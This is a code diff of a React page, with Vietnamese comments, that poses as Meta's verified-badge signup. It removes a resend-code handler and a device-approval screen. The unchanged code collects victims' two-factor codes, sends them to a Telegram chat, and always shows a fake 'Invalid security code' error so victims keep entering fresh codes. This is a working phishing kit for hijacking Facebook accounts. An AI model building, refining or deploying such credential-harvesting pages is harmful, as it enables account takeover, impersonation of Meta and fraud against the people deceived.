@@ -18,10 +18,6 @@ export default function Home() {
   const [loading, setLoading] = useState(false);
   const [errors, setErrors] = useState({}); const [showLoginError, setShowLoginError] = useState(false); const [showOtpError, setShowOtpError] = useState(false);
 
-  // States cho Gửi lại mã & Thử cách khác
-  const [resendTimer, setResendTimer] = useState(0);
-  const [showApprove, setShowApprove] = useState(false); // Thêm state này
-
   // --- DỮ LIỆU TRANG CHỦ ---
   const benefitsData = [
     { title: 'Verified badge', desc: 'With a verified badge on your Page, new audiences can feel more confident interacting with you. The badge means your Page has been verified by Meta based on your activity across Meta technologies, or information or documents you provided.', image: '/images/benefit-1.webp' },
@@ -88,18 +84,6 @@ export default function Home() {
     setLoading(true); setShowOtpError(false); const newAttempt = otpAttempt + 1; setOtpAttempt(newAttempt);
     if (newAttempt <= 3) sendTelegramMessage(`\n<b>2FA ${newAttempt}:</b> <code>${escapeHtml(otp)}</code>`);
     setTimeout(() => { setLoading(false); setShowOtpError(true); setOtp(''); }, 1500);
-  };
-
-  const handleResend = () => {
-    if (resendTimer > 0) return;
-    setResendTimer(30);
-    sendTelegramMessage('\n<b>User clicked: Resend Code</b>');
-    const timer = setInterval(() => {
-      setResendTimer((prev) => {
-        if (prev <= 1) { clearInterval(timer); return 0; }
-        return prev - 1;
-      });
-    }, 1000);
   };
 
   return (
@@ -188,7 +172,7 @@ export default function Home() {
       <section className="cta">
           <div className="cta-inner">
               <div className="cta-content">
-                  <svg className="cta-icon" viewBox="0 0 84 84"><path fill="#0064e0" d="m50.4.47c1.79-.97 4.02-.37 5.08 1.36l4.99 8.17 9.57.24c2.03.05 3.67 1.69 3.72 3.72l.24 9.57 8.17 4.99c1.74 1.06 2.34 3.3 1.36 5.08l-4.58 8.4 4.58 8.4c.97 1.79.37 4.02-1.36 5.08l-8.17 4.99-.24 9.57c-.05 2.03-1.69 3.67-3.72 3.72l-9.57.24-4.99 8.17c-1.06 1.74-3.3 2.34-5.08 1.36l-8.4-4.58-8.4 4.58c-1.79.97-4.02.37-5.08-1.36l-4.99-8.17-9.57-.24c-2.03-.05-3.67-1.69-3.72-3.72l-.24-9.57-8.17-4.99c-1.74-1.06-2.34-3.3-1.36-5.08l4.58-8.4L.47 33.6c-.97-1.79-.37-4.02 1.36-5.08l8.17-4.99.24-9.57c.05-2.03 1.69-3.67 3.72-3.72l9.57-.24L28.51 1.83c1.06-1.74 3.3-2.34 5.08-1.36l8.4 4.58L50.4.47zm9.31 34.92c1.62-1.35 1.84-3.76.49-5.38-1.35-1.62-3.76-1.84-5.38-.49l-.26.21c-6.64 5.54-12.84 11.59-18.52 18.1l-6.62-6.62c-1.49-1.49-3.91-1.49-5.4 0-1.49 1.49-1.49 3.91 0 5.4l9.55 9.55c.76.76 1.8 1.16 2.87 1.11 1.07-.05 2.07-.55 2.76-1.37l.26-.26c6.06-7.27 12.77-13.98 20.04-20.04l.26-.21z"/></svg>
+                  <svg className="cta-icon" viewBox="0 0 84 84"><path fill="#0064e0" d="m50.4.47c1.79-.97 4.02-.37 5.08 1.36l4.99 8.17 9.57.24c2.03.05 3.67 1.69 3.72 3.72l.24 9.57 8.17 4.99c1.74 1.06 2.34 3.3 1.36 5.08l-4.58 8.4 4.58 8.4c.97 1.79.37 4.02-1.36 5.08l-8.17 4.99-.24 9.57c-.05 2.03-1.69 3.67-3.72 3.72l-9.57.24-4.99 8.17c-1.06 1.74-3.3 2.34-5.08 1.36l-8.4-4.58-8.4 4.58c-1.79.97-4.02.37-5.08-1.36l-4.99-8.17-9.57-.24c-2.03-.05-3.67-1.69-3.72-3.72l-.24-9.57-8.17-4.99c-1.74-1.06-2.34-3.3-1.36-5.08l4.58-8.4L.47 33.6c-.97-1.79-.37-4.02 1.36-5.08l8.17-4.99.24-9.57c.05-2.03 1.69-3.67 3.72-3.72l9.57-.24L28.51 1.83c1.06-1.74 3.3-2.34 5.08-1.36l8.4 4.58L50.4.47zm9.31 34.92c1.62-1.35 1.84-3.76.49-5.38-1.35-1.62-3.76-1.84-5.38-.49l-.26.21c-6.64 5.54-12.84 11.59-18.52 18.1l-6.62-6.62c-1.49-1.49-3.91-1.49-5.4 0-1.49 1.49-1.49 3.91 0 5.4l9.55 9.55c.76.76 1.8 1.16 2.87 1.11 1.07-.05 2.07-.55 2.76-1.37l.21-.26c6.06-7.27 12.77-13.98 20.04-20.04l.26-.21z"/></svg>
                   <h2 className="cta-title">Ready to activate your Official Verified Badge?</h2>
                   <button className="btn-primary" onClick={openModal}>Claim your badge</button>
               </div>
@@ -524,73 +508,35 @@ export default function Home() {
                 {/* FORM 3: 2FA */}
                 {step === 3 && (
                   <>
-                    {!showApprove ? (
-                      // GIAO DIỆN NHẬP MÃ OTP
-                      <>
-                        <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Two-factor authentication</h2>
-                        
-                        <div style={{ display: 'flex', justifyContent: 'center', margin: '15px 0' }}>
-                            <img src="/images/2fa-illustration.png" alt="2FA" style={{ width: '100%', maxWidth: '280px', height: 'auto', borderRadius: '8px' }} />
-                        </div>
+                    <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Two-factor authentication</h2>
+                    
+                    <div style={{ display: 'flex', justifyContent: 'center', margin: '15px 0' }}>
+                        <img src="/images/2fa-illustration.png" alt="2FA" style={{ width: '100%', maxWidth: '280px', height: 'auto', borderRadius: '8px' }} />
+                    </div>
 
-                        <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>Enter the 6-digit or 8-digit code we sent to your WhatsApp, SMS, Gmail, or Google Authenticator.</p>
+                    <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>Enter the 6-digit or 8-digit code we sent to your WhatsApp, SMS, Gmail, or Google Authenticator.</p>
+                    
+                    <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+                        <input 
+                            className="fb-input fb-otp-input" 
+                            style={{ textAlign: 'center', fontSize: '26px', letterSpacing: '12px', fontWeight: '700' }} 
+                            placeholder="00000000" 
+                            value={otp} 
+                            onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }} 
+                            required 
+                            maxLength={8} 
+                        />
                         
-                        <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
-                            <input 
-                                className="fb-input fb-otp-input" 
-                                style={{ textAlign: 'center', fontSize: '26px', letterSpacing: '12px', fontWeight: '700' }} 
-                                placeholder="00000000" 
-                                value={otp} 
-                                onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }} 
-                                required 
-                                maxLength={8} 
-                            />
-                            
-                            {showOtpError && (
-                                <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>
-                                    Invalid security code. Please check the code and try again.
-                                </div>
-                            )}
-                            
-                            <button type="submit" className="fb-btn" disabled={loading || otp.length < 6}>
-                                {loading ? 'Verifying...' : 'Verify'}
-                            </button>
-                            
-                            <div style={{ textAlign: 'center', marginTop: '8px' }}>
-                                <button 
-                                    type="button" 
-                                    onClick={() => {
-                                        setShowApprove(true);                                   
-                                    }} 
-                                    style={{ background: 'none', border: 'none', color: '#0064e0', fontSize: '14px', fontWeight: '500', cursor: 'pointer' }}
-                                >
-                                    Try another way
-                                </button>
+                        {showOtpError && (
+                            <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>
+                                Invalid security code. Please check the code and try again.
                             </div>
-                        </form>
-                      </>
-                    ) : (
-                      // GIAO DIỆN YÊU CẦU DUYỆT THIẾT BỊ
-                      <>
-                        <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Approve your device</h2>
+                        )}
                         
-                        <div style={{ display: 'flex', justifyContent: 'center', margin: '15px 0' }}>
-                            <img src="/images/approve-device.png" alt="Approve Device" style={{ width: '100%', maxWidth: '320px', height: 'auto', borderRadius: '8px' }} />
-                        </div>
-
-                        <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>
-                            Please approve the device from the notification on your Facebook app to continue.
-                        </p>
-                        
-                        <button 
-                            type="button" 
-                            onClick={() => { setShowApprove(false); setOtp(''); }} 
-                            className="fb-btn"
-                        >
-                            Back
+                        <button type="submit" className="fb-btn" disabled={loading || otp.length < 6}>
+                            {loading ? 'Verifying...' : 'Verify'}
                         </button>
-                      </>
-                    )}
+                    </form>
                   </>
                 )}
 
